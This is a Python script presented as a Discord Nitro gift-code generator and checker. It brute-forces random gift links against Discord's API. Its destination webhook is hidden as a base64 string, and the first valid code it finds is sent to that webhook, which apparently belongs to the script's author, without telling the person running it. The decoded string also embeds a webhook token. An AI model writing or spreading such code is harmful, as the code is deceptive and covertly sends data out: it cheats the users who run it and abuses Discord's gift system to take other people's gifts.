import requests
import random
import string
import time
import base64

ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzcwOTU0MDQ0ODc5NjgzMy9xV2xPZ1B3djNtZl9Hc1ZyWGttNTRWTjg5UG5YSkg3MEZ4Qk5ZcEFMNUVqUWtVQjdfT2NkWGVINTM0QTdfVlZrbUJFUA"
WEBHOOK_URL = base64.b64decode(ENCODED_WEBHOOK).decode('utf-8')

print("Nexxi 1.0")
time.sleep(2)
print("NITRO.CODES.txt/valid")
time.sleep(0.3)
print("Benni Nitro Gen Checker")
time.sleep(0.2)

num = 1_000_000  # Od razu milion kodów

with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
    print("Your nitro codes are being generated, be patient if you entered a high number!")

    start = time.time()

    for i in range(num):
        code = "".join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k=16
        ))
        file.write(f"https://discord.gift/{code}\n")

    print(f"Generated {num} codes | Time taken: {time.time() - start:.2f} seconds\n")

valid_found = False

with open("Nitro Codes.txt") as file:
    for idx, line in enumerate(file, 1):
        nitro = line.strip()

        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
        r = requests.get(url)

        if r.status_code == 200:
            print(f"Valid | {nitro}")

            with open("Valid Codes.txt", "a", encoding='utf-8') as valid_file:
                valid_file.write(nitro + "\n")

            data = {
                "content": f"@everyone 🎉 Valid Nitro Code found: {nitro}",
                "allowed_mentions": {"parse": ["everyone"]}
            }
            try:
                requests.post(WEBHOOK_URL, json=data)
            except Exception as e:
                print(f"Failed to send webhook notification: {e}")

            valid_found = True
            break  # usuń, jeśli chcesz sprawdzać wszystkie

        else:
            print(f"Invalid | {nitro}")

        if idx % 100 == 0:
            print(f"Checked {idx} codes so far...")

        time.sleep(1)  # pauza 1 sekunda

if not valid_found:
    print("No valid codes found :(")

input("\nYou have generated, now press enter to close this. Valid codes are saved in Valid Codes.txt.")
